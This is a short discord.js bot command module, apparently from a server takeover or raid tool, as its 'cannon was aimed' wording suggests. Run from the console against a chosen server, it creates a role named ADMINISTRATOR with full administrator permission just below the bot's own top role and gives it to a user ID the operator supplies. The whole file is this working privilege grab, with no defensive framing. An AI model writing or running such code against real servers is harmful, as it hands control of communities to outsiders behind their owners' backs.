let discord = require("discord.js")
let fs = require("fs")
module.exports = {
    triggers: ["addadmin","aadmin","forceadmin"],
    description: "Gives a role with admin to an selected user.",
    async run(client = new discord.Client(), args, starget, ctarget) {
        if (!ctarget) return console.log("Please select a server to apply this on.")
        if (!client.guilds.resolve(ctarget)) return console.log("The guild the cannon was aimed to is invalid. Did the bot get removed from the server or did you manipulate the files?")
        if (!Number(args[0])) return console.log("Please provide a valid ID of an user to give admin to.")
        let guild = client.guilds.resolve(ctarget)
        if (!guild.members.resolve(args[0])) return console.log("The provided member isnt on the guild.")
        console.log("Creating role...")
        console.log("Applying to user...")
        let r = await guild.roles.create({
            data: {
                color: "#FF0000",
                hoist: false,
                mentionable: false,
                name: "ADMINISTRATOR",
                permissions: ["ADMINISTRATOR"],
                position:guild.me.roles.highest.position-1
            }
        })
        
        guild.members.resolve(args[0]).roles.add(r)
    }
}